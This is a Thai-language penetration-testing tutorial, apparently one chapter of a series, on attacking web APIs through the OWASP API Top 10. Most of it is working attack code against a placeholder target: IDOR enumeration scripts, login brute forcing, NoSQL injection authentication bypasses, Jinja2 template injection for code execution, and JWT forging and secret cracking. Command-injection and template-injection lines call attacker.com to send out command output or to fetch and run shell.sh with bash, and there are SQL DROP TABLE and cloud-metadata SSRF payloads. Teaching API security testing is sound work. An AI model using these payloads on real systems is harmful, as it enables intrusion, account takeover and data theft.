# Part 57: API Security Testing (การทดสอบความปลอดภัย API)

## สารบัญ
1. [API Security Overview](#1-api-security-overview)
2. [OWASP API Top 10](#2-owasp-api-top-10)
3. [API Discovery และ Reconnaissance](#3-api-discovery-และ-reconnaissance)
4. [Authentication Attacks](#4-authentication-attacks)
5. [Authorization Vulnerabilities](#5-authorization-vulnerabilities)
6. [Injection ใน APIs](#6-injection-ใน-apis)
7. [GraphQL Security](#7-graphql-security)
8. [JWT Security](#8-jwt-security)
9. [Automated API Testing](#9-automated-api-testing)
10. [แบบฝึกหัด Lab](#10-แบบฝึกหัด-lab)

---

## 1. API Security Overview

### 1.1 API Attack Surface

```
API Architecture:

Client Apps <-> API Gateway <-> Microservices <-> Database
   |                |               |
   |                |               |
   v                v               v
(mobile/web)  (auth, rate     (REST/GraphQL/
              limiting)        gRPC services)

API Vulnerabilities:
- Broken Object Level Auth (BOLA/IDOR)
- Broken Authentication
- Excessive Data Exposure
- Lack of Resource Limits
- Broken Function Level Auth
- Mass Assignment
- Security Misconfiguration
- Injection
- Improper Assets Management
- Insufficient Logging
```

### 1.2 Tools Setup

```bash
# Burp Suite Pro
# https://portswigger.net/burp

# OWASP ZAP
sudo apt install zaproxy

# ติดตั้ง kiterunner (สำหรับ API discovery)
wget https://github.com/assetnote/kiterunner/releases/download/v1.0.2/kr-linux-amd64
chmod +x kr-linux-amd64
sudo mv kr-linux-amd64 /usr/local/bin/kr

# ติดตั้ง arjun (HTTP parameter discovery)
pip3 install arjun

# ติดตั้ง ffuf สำหรับ fuzzing
wget https://github.com/ffuf/ffuf/releases/download/v2.1.0/ffuf_2.1.0_linux_amd64.tar.gz
tar xf ffuf_*.tar.gz
sudo mv ffuf /usr/local/bin/

# ติดตั้ง httpie
pip3 install httpie

# Insomnia / Postman
# Download from official site
```

---

## 2. OWASP API Top 10

### API1: Broken Object Level Authorization (BOLA/IDOR)

```bash
# IDOR: เข้าถึงไฟล์ของคนอื่นโดยเปลี่ยน ID

# ตัวอย่าง: คุณเข้าถึง order 123
GET /api/orders/123
Authorization: Bearer <your_token>

# ลองเปลี่ยน ID
GET /api/orders/122  # ได้ order ของคนอื่น!
GET /api/orders/124

# Automate IDOR testing
python3 << 'EOF'
import requests

headers = {'Authorization': 'Bearer your_token_here'}
base_url = 'https://api.target.com/api/orders/'

for order_id in range(1, 200):
    response = requests.get(f'{base_url}{order_id}', headers=headers)
    if response.status_code == 200:
        data = response.json()
        print(f'[+] Found order {order_id}: {data}')
    elif response.status_code != 404:
        print(f'[?] Unexpected status {response.status_code} for ID {order_id}')
EOF

# BFLA (Broken Function Level Authorization)
# User อาจเรียก admin endpoints
GET /api/admin/users
POST /api/admin/users/delete
```

### API2: Broken Authentication

```bash
# Brute force ด้วย hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
    -o results.txt \
    http-post-form \
    "https://api.target.com/login:username=^USER^&password=^PASS^:Invalid credentials"

# ตรวจสอบ weak reset tokens
# Reset token ควรเป็น random และ expiry สั้น
for i in $(seq 1 100); do
    curl -s -X POST https://api.target.com/reset-password \
        -d '{"email":"victim@example.com"}' \
        -H 'Content-Type: application/json' | jq '.token'
done

# ตรวจสอบ no rate limiting
for i in $(seq 1 1000); do
    curl -s -X POST https://api.target.com/login \
        -d '{"username":"admin","password":"'$i'"}' \
        -H 'Content-Type: application/json'
done
```

### API3: Excessive Data Exposure

```bash
# API ส่งข้อมูลมากเกินไป
curl https://api.target.com/users/profile
# {
#   "id": 1,
#   "username": "alice",
#   "email": "alice@example.com",
#   "password_hash": "$2b$10$...",  <- shouldn't be here!
#   "credit_card": "4111111111111111",  <- definitely shouldn't!
#   "ssn": "123-45-6789",
#   "internal_notes": "admin_user"
# }

# ค้นหาข้อมูลที่แสดงมาแต่ไม่ควรแสดง
python3 << 'EOF'
import requests, json

response = requests.get('https://api.target.com/users/1',
                       headers={'Authorization': 'Bearer token'})

data = response.json()
sensitive_fields = ['password', 'hash', 'secret', 'key', 'ssn', 
                    'credit_card', 'cvv', 'token', 'private']

for field in data.keys():
    for sensitive in sensitive_fields:
        if sensitive in field.lower():
            print(f'[!] Sensitive field exposed: {field} = {data[field]}')
EOF
```

### API4: Lack of Resources & Rate Limiting

```bash
# ตรวจสอบ rate limiting
for i in $(seq 1 100); do
    curl -s -X POST https://api.target.com/search \
        -d '{"query": "expensive_query"}' \
        -H 'Content-Type: application/json' \
        -w "HTTP %{http_code}\n" &
done
wait

# ตรวจสอบ large payload
python3 -c "
import json
payload = {'data': 'A' * 100000}  # 100KB payload
print(json.dumps(payload))
" | curl -s -X POST https://api.target.com/upload \
    -H 'Content-Type: application/json' \
    --data-binary @-

# regex DoS (ReDoS)
curl -X POST https://api.target.com/validate \
    -d '{"email": "aaaaaaaaaaaaaaaaaaaaaaa@b.c"}' \
    -H 'Content-Type: application/json'
```

---

## 3. API Discovery และ Reconnaissance

### 3.1 API Endpoint Discovery

```bash
# หา API endpoints ด้วย ffuf
ffuf -u https://target.com/FUZZ \
    -w /usr/share/wordlists/api_wordlist.txt \
    -mc 200,201,204,301,302,401,403 \
    -t 50

# ใช้ kiterunner สำหรับ API-specific wordlists
kr scan https://target.com -w routes-small.kite
kr scan https://target.com -A=apiroutes-210328:20000

# ค้นหา API documentation
ffuf -u https://target.com/FUZZ \
    -w /usr/share/wordlists/api_docs.txt \
    -mc 200
# Targets: /api/swagger.json, /api/docs, /api-docs, /openapi.json
#          /swagger/index.html, /api/v1/docs

# หา API จาก JavaScript
python3 << 'EOF'
import requests, re

# ดาวน์โหลด main JavaScript
js_url = 'https://target.com/static/main.js'
response = requests.get(js_url)

# หา API endpoints
patterns = [
    r'"/api/[^"]+"',
    r"'/api/[^']+'",
    r'fetch\(["\']([^"\')]+)["\']',
    r'axios\.[a-z]+\(["\']([^"\')]+)["\']',
]

endpoints = set()
for pattern in patterns:
    matches = re.findall(pattern, response.text)
    endpoints.update(matches)

for ep in sorted(endpoints):
    print(ep)
EOF

# ค้นหา GraphQL endpoint
for endpoint in '/graphql' '/graphiql' '/api/graphql' '/query' '/gql'; do
    code=$(curl -s -o /dev/null -w "%{http_code}" https://target.com$endpoint)
    echo "$endpoint: $code"
done
```

### 3.2 API Version และ Method Discovery

```bash
# ตรวจสอบ HTTP methods
for method in GET POST PUT PATCH DELETE OPTIONS HEAD; do
    curl -s -X $method https://api.target.com/users \
        -w "$method: %{http_code}\n" \
        -o /dev/null
done

# ตรวจสอบ API versions
for version in v1 v2 v3 v4 beta alpha dev; do
    curl -s -o /dev/null -w "v$version: %{http_code}\n" \
        https://api.target.com/api/$version/users
done

# arjun: หา HTTP parameters
arjun -u https://api.target.com/search -m GET
arjun -u https://api.target.com/users -m POST

# ตรวจสอบ HTTP headers พิเศษ
for header in 'X-Custom-IP-Authorization: 127.0.0.1' 'X-Forwarded-For: 127.0.0.1' 'X-Internal: true'; do
    curl -s -H "$header" https://api.target.com/admin/users \
        -w "$header: %{http_code}\n" -o /dev/null
done
```

---

## 4. Authentication Attacks

### 4.1 API Key Testing

```bash
# ตรวจสอบ API key ใน หลายที่
python3 << 'EOF'
import requests

# ตรวจสอบ API key ใน header, URL, cookie
api_key = 'test_api_key_123'
target = 'https://api.target.com/endpoint'

# Method 1: Header
print('[1] Testing X-API-Key header')
r = requests.get(target, headers={'X-API-Key': api_key})
print(f'  Status: {r.status_code}')

# Method 2: Query parameter
print('[2] Testing ?api_key= parameter')
r = requests.get(f'{target}?api_key={api_key}')
print(f'  Status: {r.status_code}')

# Method 3: Authorization Bearer
print('[3] Testing Bearer token')
r = requests.get(target, headers={'Authorization': f'Bearer {api_key}'})
print(f'  Status: {r.status_code}')

# Method 4: Basic Auth
print('[4] Testing Basic Auth')
r = requests.get(target, auth=(api_key, ''))
print(f'  Status: {r.status_code}')
EOF

# Brute force API key
python3 << 'EOF'
import requests, string, itertools

# ถ้า API key สั้น (demo)
alphabet = string.ascii_lowercase + string.digits
for length in range(4, 7):
    for combo in itertools.product(alphabet, repeat=length):
        key = ''.join(combo)
        r = requests.get('https://api.target.com/secret',
                        headers={'X-API-Key': key})
        if r.status_code == 200:
            print(f'[+] Found API key: {key}')
            break
EOF
```

### 4.2 OAuth 2.0 Attacks

```bash
# OAuth Code Interception (CSRF)
# 1. Generate authorization URL โดยไม่มี state parameter
https://oauth.provider.com/authorize?
  client_id=app123&
  redirect_uri=https://attacker.com/callback&
  response_type=code&
  scope=read:user
  # NO state parameter! CSRF vulnerable!

# Redirect URI Manipulation
# Registered: https://app.target.com/callback
https://oauth.provider.com/authorize?
  redirect_uri=https://attacker.com/callback  # might work if validation is weak
https://oauth.provider.com/authorize?
  redirect_uri=https://app.target.com.attacker.com/callback  # subdomain trick
https://oauth.provider.com/authorize?
  redirect_uri=https://app.target.com/../evil  # path traversal

# Token Scope Abuse
# Request minimal scope, but try to access more
curl -H 'Authorization: Bearer <token_with_read_scope>' \
    -X POST https://api.target.com/users/profile  # write operation
```

---

## 5. Authorization Vulnerabilities

### 5.1 BOLA (Broken Object Level Authorization)

```python
#!/usr/bin/env python3
# bola_tester.py
import requests
import concurrent.futures

class BOLATester:
    def __init__(self, base_url, token):
        self.base_url = base_url
        self.headers = {'Authorization': f'Bearer {token}'}
        self.findings = []
    
    def test_idor(self, endpoint_template, id_range=range(1, 1000)):
        """Test IDOR by iterating IDs"""
        print(f'[*] Testing IDOR on: {endpoint_template}')
        
        def check_id(item_id):
            url = endpoint_template.format(id=item_id)
            try:
                r = requests.get(url, headers=self.headers, timeout=5)
                if r.status_code == 200:
                    return item_id, r.json()
            except:
                pass
            return None
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            results = list(executor.map(check_id, id_range))
        
        for result in results:
            if result:
                item_id, data = result
                self.findings.append({
                    'type': 'IDOR',
                    'id': item_id,
                    'data': data
                })
                print(f'[+] Found: ID {item_id}')
    
    def test_uuid_idor(self, endpoint_template, uuids):
        """Test IDOR with UUID list"""
        for uuid in uuids:
            url = endpoint_template.format(id=uuid)
            r = requests.get(url, headers=self.headers, timeout=5)
            if r.status_code == 200:
                print(f'[+] IDOR found with UUID: {uuid}')
                self.findings.append({'type': 'UUID_IDOR', 'id': uuid})
    
    def test_privilege_escalation(self, endpoints):
        """Test horizontal/vertical privilege escalation"""
        for endpoint, method in endpoints:
            try:
                if method == 'GET':
                    r = requests.get(f'{self.base_url}{endpoint}', 
                                    headers=self.headers)
                elif method == 'POST':
                    r = requests.post(f'{self.base_url}{endpoint}',
                                     headers=self.headers,
                                     json={})
                
                if r.status_code in [200, 201]:
                    print(f'[+] Access to {endpoint}: {r.status_code}')
                    self.findings.append({'type': 'PrivEsc', 'endpoint': endpoint})
            except:
                pass

# ใช้งาน
tester = BOLATester('https://api.target.com', 'victim_token')
tester.test_idor('https://api.target.com/api/orders/{id}')
tester.test_privilege_escalation([
    ('/api/admin/users', 'GET'),
    ('/api/admin/config', 'GET'),
    ('/api/admin/delete_user', 'POST'),
])
```

### 5.2 Mass Assignment

```bash
# Mass Assignment: ส่ง properties ที่ไม่ควรอนุญาต

# Normal registration
curl -X POST https://api.target.com/register \
    -H 'Content-Type: application/json' \
    -d '{"username":"hacker","password":"pass123"}'

# Mass assignment attack: เพิ่ม fields ที่ไม่ควรอนุญาต
curl -X POST https://api.target.com/register \
    -H 'Content-Type: application/json' \
    -d '{
        "username": "hacker",
        "password": "pass123",
        "role": "admin",
        "isAdmin": true,
        "credits": 999999,
        "verified": true
    }'

# ตรวจสอบ update profile
curl -X PUT https://api.target.com/users/profile \
    -H 'Content-Type: application/json' \
    -H 'Authorization: Bearer user_token' \
    -d '{
        "displayName": "Alice",
        "userId": 1,
        "role": "admin",
        "balance": 99999
    }'

# เครื่องมือ automation
python3 << 'EOF'
import requests

base_payload = {"username": "test", "password": "test123"}
# fields พิเศษที่ลอง
extra_fields = [
    {"role": "admin"},
    {"isAdmin": True},
    {"admin": True},
    {"is_admin": True},
    {"permissions": ["admin", "delete"]},
    {"access_level": 9},
    {"userId": 1},
    {"credits": 99999},
    {"verified": True},
]

for extra in extra_fields:
    payload = {**base_payload, **extra}
    r = requests.post('https://api.target.com/register',
                     json=payload)
    if r.status_code in [200, 201]:
        print(f'[+] Mass assignment might work with: {extra}')
        print(f'    Response: {r.text[:200]}')
EOF
```

---

## 6. Injection ใน APIs

### 6.1 NoSQL Injection

```bash
# MongoDB ใช้แผนสำหรับ authentication
# Normal login
curl -X POST https://api.target.com/login \
    -H 'Content-Type: application/json' \
    -d '{"username":"alice","password":"password123"}'

# NoSQL injection: bypass authentication
curl -X POST https://api.target.com/login \
    -H 'Content-Type: application/json' \
    -d '{"username":{"$ne":"x"},"password":{"$ne":"x"}}'

# MongoDB operator injection
curl -X POST https://api.target.com/login \
    -H 'Content-Type: application/json' \
    -d '{"username":"admin","password":{"$gt":""}}'

# อ่านข้อมูลทั้งหมด
curl -X GET 'https://api.target.com/users?id[$ne]=null'
curl -X GET 'https://api.target.com/users?name[$regex]=.*'
curl -X GET 'https://api.target.com/users?name[$where]=1==1'
```

```python
#!/usr/bin/env python3
# nosql_inject.py
import requests, json

target = 'https://api.target.com/login'

# สร้าง NoSQL injection payloads
payloads = [
    # bypass password check
    {"username": "admin", "password": {"$ne": ""}},
    {"username": "admin", "password": {"$gt": ""}},
    {"username": "admin", "password": {"$exists": True}},
    
    # get all users
    {"username": {"$ne": ""}, "password": {"$ne": ""}},
    
    # regex search
    {"username": {"$regex": "admin"}, "password": {"$ne": ""}},
    
    # where clause
    {"username": "admin", "password": {"$where": "this.password.length > 0"}},
]

for payload in payloads:
    r = requests.post(target, json=payload)
    print(f'Payload: {json.dumps(payload)}')
    print(f'Response: {r.status_code} - {r.text[:100]}')
    print()
```

### 6.2 SSTI ใน API Responses

```bash
# Server-Side Template Injection
# ตรวจสอบ เมื่อ input ถูก render เป็น template
curl https://api.target.com/greet?name='{{7*7}}'
# ถ้า response คือ 49 = SSTI vulnerable!

# หา template engine
curl 'https://api.target.com/greet?name={{7*7}}'
    # 49 -> Jinja2 (Python) or Twig (PHP)
curl 'https://api.target.com/greet?name=${7*7}'
    # 49 -> Freemarker (Java) or Thymeleaf
curl 'https://api.target.com/greet?name=<%= 7*7 %>'
    # 49 -> ERB (Ruby)

# RCE ผ่าน SSTI (Jinja2)
curl 'https://api.target.com/greet?name={{config.__class__.__init__.__globals__["os"].popen("id").read()}}'

# Blind SSTI (out-of-band)
curl 'https://api.target.com/greet?name={{config.__class__.__init__.__globals__["os"].popen("curl+http://attacker.com/$(id)").read()}}'
```

### 6.3 Command Injection ใน API

```bash
# ตรวจสอบ command injection
curl -X POST https://api.target.com/ping \
    -H 'Content-Type: application/json' \
    -d '{"host":"8.8.8.8"}'

# Inject commands
curl -X POST https://api.target.com/ping \
    -H 'Content-Type: application/json' \
    -d '{"host":"8.8.8.8; id"}'

curl -X POST https://api.target.com/ping \
    -H 'Content-Type: application/json' \
    -d '{"host":"8.8.8.8 | cat /etc/passwd"}'

curl -X POST https://api.target.com/ping \
    -H 'Content-Type: application/json' \
    -d '{"host":"8.8.8.8 && wget http://attacker.com/shell.sh && bash shell.sh"}'

# Out-of-band detection
curl -X POST https://api.target.com/ping \
    -H 'Content-Type: application/json' \
    -d '{"host":"$(curl http://attacker.com/cmdi_test)"}'
```

---

## 7. GraphQL Security

### 7.1 GraphQL Reconnaissance

```bash
# Introspection query (ถ้า enabled)
curl -X POST https://api.target.com/graphql \
    -H 'Content-Type: application/json' \
    -d '{
      "query": "{ __schema { types { name fields { name } } } }"
    }'

# หา types ทั้งหมด
INTROSPECTION='{
  "query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { ...FullType } } } fragment FullType on __Type { kind name fields(includeDeprecated: true) { name args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name isDeprecated } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }"
}'

curl -X POST https://api.target.com/graphql \
    -H 'Content-Type: application/json' \
    -d "$INTROSPECTION"

# ใช้ GraphQL Voyager วิชัย schema
```

### 7.2 GraphQL Attacks

```bash
# Introspection Bypass (ถ้า disabled)
curl -X POST https://api.target.com/graphql \
    -H 'Content-Type: application/json' \
    -d '{ "query": "{ __typename }" }'  # check if accessible

# Field suggestion (Clairvoyance)
curl -X POST https://api.target.com/graphql \
    -H 'Content-Type: application/json' \
    -d '{ "query": "{ __typenme }" }'
# Error: Did you mean __typename? <- field suggestion!

# IDOR ใน GraphQL
curl -X POST https://api.target.com/graphql \
    -H 'Content-Type: application/json' \
    -d '{
      "query": "query { user(id: 2) { id email password } }"
    }'

# Batch queries (rate limit bypass)
curl -X POST https://api.target.com/graphql \
    -H 'Content-Type: application/json' \
    -d '[
      {"query": "query { user(id: 1) { email } }"},
      {"query": "query { user(id: 2) { email } }"},
      {"query": "query { user(id: 3) { email } }"}
    ]'

# GraphQL Injection
curl -X POST https://api.target.com/graphql \
    -H 'Content-Type: application/json' \
    -d '{
      "query": "query { user(name: \\"admin\\") { name id } }"
    }'

# Mutation injection
curl -X POST https://api.target.com/graphql \
    -H 'Content-Type: application/json' \
    -d '{
      "query": "mutation { updateUser(id: 1, role: \\"admin\\") { id role } }"
    }'
```

---

## 8. JWT Security

### 8.1 JWT Analysis

```python
#!/usr/bin/env python3
# jwt_analyzer.py
import base64, json, hmac, hashlib

def decode_jwt(token):
    """Decode JWT without verification"""
    parts = token.split('.')
    
    def decode_part(part):
        # เพิ่ม padding
        padded = part + '=' * (4 - len(part) % 4)
        try:
            return json.loads(base64.urlsafe_b64decode(padded))
        except:
            return base64.urlsafe_b64decode(padded)
    
    if len(parts) != 3:
        return None, None, None
    
    header = decode_part(parts[0])
    payload = decode_part(parts[1])
    signature = parts[2]
    
    return header, payload, signature

def check_vulnerabilities(token):
    header, payload, sig = decode_jwt(token)
    
    findings = []
    
    # Check alg: none attack
    if header.get('alg', '').lower() == 'none':
        findings.append('CRITICAL: alg=none!')
    
    # Check weak algorithm
    weak_algs = ['HS256', 'HS384', 'HS512']
    if header.get('alg') in weak_algs:
        findings.append(f'WARNING: Symmetric algorithm {header["alg"]} - brute forceable')
    
    # Check expiry
    import time
    exp = payload.get('exp')
    if exp and exp < time.time():
        findings.append('WARNING: Token is expired but might still work')
    if not exp:
        findings.append('WARNING: No expiration time')
    
    # Check sensitive data in payload
    sensitive = ['password', 'secret', 'key', 'hash']
    for key in payload.keys():
        if any(s in key.lower() for s in sensitive):
            findings.append(f'WARNING: Sensitive field in payload: {key}={payload[key]}')
    
    print('Header:', json.dumps(header, indent=2))
    print('Payload:', json.dumps(payload, indent=2))
    print('\nFindings:')
    for f in findings:
        print(f'  {f}')

# ใช้งาน
token = 'eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWxpY2UifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c'
check_vulnerabilities(token)
```

### 8.2 JWT Attacks

```python
#!/usr/bin/env python3
# jwt_attacks.py
import base64, json, hmac, hashlib, requests

def alg_none_attack(token):
    """Change algorithm to 'none' to bypass signature"""
    parts = token.split('.')
    
    # Decode header
    padded = parts[0] + '=' * (4 - len(parts[0]) % 4)
    header = json.loads(base64.urlsafe_b64decode(padded))
    
    # Change alg to none
    header['alg'] = 'none'
    
    # Encode ใหม่
    new_header = base64.urlsafe_b64encode(
        json.dumps(header).encode()
    ).rstrip(b'=').decode()
    
    # สร้าง token โดยไม่มี signature
    forged_token = f"{new_header}.{parts[1]}."
    print(f'[+] alg=none token: {forged_token}')
    return forged_token

def modify_payload(token, modifications):
    """Modify JWT payload (keep same structure)"""
    parts = token.split('.')
    
    # Decode payload
    padded = parts[1] + '=' * (4 - len(parts[1]) % 4)
    payload = json.loads(base64.urlsafe_b64decode(padded))
    
    # Modify
    payload.update(modifications)
    print(f'[+] Modified payload: {payload}')
    
    # Encode
    new_payload = base64.urlsafe_b64encode(
        json.dumps(payload).encode()
    ).rstrip(b'=').decode()
    
    return f"{parts[0]}.{new_payload}.{parts[2]}"

def brute_force_secret(token, wordlist_path):
    """Brute force JWT HS256 secret"""
    parts = token.split('.')
    message = f'{parts[0]}.{parts[1]}'.encode()
    
    # Decode signature
    padded = parts[2] + '=' * (4 - len(parts[2]) % 4)
    sig = base64.urlsafe_b64decode(padded)
    
    with open(wordlist_path, 'rb') as f:
        for line in f:
            secret = line.strip()
            h = hmac.new(secret, message, hashlib.sha256)
            if h.digest() == sig:
                print(f'[+] Found secret: {secret.decode()}')
                return secret.decode()
    
    print('[-] Secret not found')
    return None

# Test
token = 'eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoidXNlciJ9.X'

# Attack 1: alg=none
forged = alg_none_attack(token)

# Attack 2: Privilege escalation
admin_token = modify_payload(token, {'role': 'admin', 'user': 'admin'})
print(f'Admin token (unverified): {admin_token}')

# Attack 3: Brute force
# brute_force_secret(token, '/usr/share/wordlists/rockyou.txt')
```

---

## 9. Automated API Testing

### 9.1 Comprehensive API Scanner

```python
#!/usr/bin/env python3
# api_scanner.py
import requests, json, re, time
from urllib.parse import urljoin

class APIScanner:
    def __init__(self, base_url, token=None):
        self.base_url = base_url
        self.headers = {}
        if token:
            self.headers['Authorization'] = f'Bearer {token}'
        self.findings = []
    
    def scan_endpoint(self, path, method='GET', data=None):
        """Scan single endpoint for vulnerabilities"""
        url = urljoin(self.base_url, path)
        
        findings = []
        
        # Test basic access
        r = requests.request(method, url, headers=self.headers, 
                            json=data, timeout=10)
        
        # Check for verbose error messages
        error_patterns = ['stack trace', 'sql syntax', 'exception', 'error at line']
        if any(p in r.text.lower() for p in error_patterns):
            findings.append(f'VERBOSE_ERROR: {url}')
        
        # Check sensitive data exposure
        sensitive = ['password', 'secret', 'api_key', 'private_key', 'credit_card']
        try:
            resp_data = r.json()
            self._check_sensitive_data(resp_data, url, findings)
        except:
            pass
        
        # Check security headers
        security_headers = ['X-Content-Type-Options', 'X-Frame-Options', 
                           'Strict-Transport-Security']
        for header in security_headers:
            if header not in r.headers:
                findings.append(f'MISSING_HEADER:{header} on {url}')
        
        # Test for IDOR
        if '{id}' in path:
            self._test_idor(path, r)
        
        return findings
    
    def _check_sensitive_data(self, data, url, findings, path=''):
        sensitive_keys = ['password', 'secret', 'token', 'key', 'hash',
                         'credit_card', 'ssn', 'private']
        
        if isinstance(data, dict):
            for k, v in data.items():
                full_key = f'{path}.{k}' if path else k
                if any(s in k.lower() for s in sensitive_keys):
                    findings.append(f'SENSITIVE_DATA:{full_key} in {url}')
                self._check_sensitive_data(v, url, findings, full_key)
        elif isinstance(data, list):
            for i, item in enumerate(data):
                self._check_sensitive_data(item, url, findings, f'{path}[{i}]')
    
    def _test_idor(self, path_template, normal_response):
        """Test for IDOR"""
        import re
        # หา ID ใน path
        id_match = re.search(r'/(\d+)', path_template)
        if not id_match:
            return
        
        current_id = int(id_match.group(1))
        test_ids = [current_id - 1, current_id + 1]
        
        for test_id in test_ids:
            test_path = path_template.replace(str(current_id), str(test_id))
            url = urljoin(self.base_url, test_path)
            r = requests.get(url, headers=self.headers, timeout=5)
            if r.status_code == 200:
                self.findings.append(f'IDOR:{url} (ID {test_id})')
    
    def run_injection_tests(self, endpoint, param):
        """Test common injection payloads"""
        injection_payloads = [
            ("SQL", "'; DROP TABLE users; --"),
            ("SQL", "' OR '1'='1"),
            ("NoSQL", '{"$ne": ""}'),
            ("SSTI", '{{7*7}}'),
            ("SSTI", '${7*7}'),
            ("XSS", '<script>alert(1)</script>'),
            ("SSRF", 'http://169.254.169.254/latest/meta-data/'),
        ]
        
        for vuln_type, payload in injection_payloads:
            url = f'{self.base_url}{endpoint}?{param}={payload}'
            try:
                r = requests.get(url, headers=self.headers, timeout=5)
                if '49' in r.text and vuln_type == 'SSTI':
                    self.findings.append(f'SSTI:{url}')
                elif 'syntax error' in r.text.lower() and vuln_type == 'SQL':
                    self.findings.append(f'SQL_INJECTION:{url}')
            except:
                pass
    
    def generate_report(self):
        """Generate security report"""
        report = {
            'target': self.base_url,
            'total_findings': len(self.findings),
            'findings': self.findings
        }
        print(json.dumps(report, indent=2))
        return report

# ใช้งาน
scanner = APIScanner('https://api.target.com', 'your_token')
scanner.scan_endpoint('/api/users/1')
scanner.scan_endpoint('/api/admin/dashboard')
scanner.run_injection_tests('/api/search', 'q')
scanner.generate_report()
```

---

## 10. แบบฝึกหัด Lab

### Lab 1: IDOR Testing ด้วย DVWS

```bash
# Deploy DVWS (Damn Vulnerable Web Services)
docker run -d -p 8000:80 ihebski/dvws-node

# Test IDOR
# Register user1 และ user2
TOKEN1=$(curl -s -X POST http://localhost:8000/users/register \
    -H 'Content-Type: application/json' \
    -d '{"username":"user1","password":"pass1"}' | jq -r '.token')

TOKEN2=$(curl -s -X POST http://localhost:8000/users/register \
    -H 'Content-Type: application/json' \
    -d '{"username":"user2","password":"pass2"}' | jq -r '.token')

# user1 ลองเข้าถึงข้อมูล user2
curl http://localhost:8000/users/2 \
    -H "Authorization: Bearer $TOKEN1"
```

### Lab 2: GraphQL Injection

```bash
# Deploy GraphQL vulnerable app
docker run -d -p 4000:4000 dolevf/dvga

# Introspection
curl -X POST http://localhost:4000/graphql \
    -H 'Content-Type: application/json' \
    -d '{"query":"{ __schema { types { name } } }"}'

# Enumerate users
curl -X POST http://localhost:4000/graphql \
    -H 'Content-Type: application/json' \
    -d '{"query":"{ users { id username email } }"}'

# IDOR via GraphQL
curl -X POST http://localhost:4000/graphql \
    -H 'Content-Type: application/json' \
    -d '{"query":"{ user(id: \"2\") { username email password } }"}'
```

### สรุป OWASP API Security Top 10

| Rank | Vulnerability | คำอธิบาย |
|------|--------------|----------|
| API1 | Broken Object Level Auth | IDOR/BOLA |
| API2 | Broken User Authentication | Weak auth |
| API3 | Excessive Data Exposure | Too much data returned |
| API4 | Lack of Resources & Rate Limiting | No limits |
| API5 | Broken Function Level Auth | BFLA |
| API6 | Mass Assignment | Unexpected fields |
| API7 | Security Misconfiguration | Bad config |
| API8 | Injection | SQLi/NoSQLi/SSTI |
| API9 | Improper Assets Management | Old versions |
| API10 | Insufficient Logging | No audit trail |

---

← [Part 56: Mobile Security](Part-56-Mobile-Security.md) | [Part 58: Active Directory Advanced](Part-58-AD-Advanced.md) →
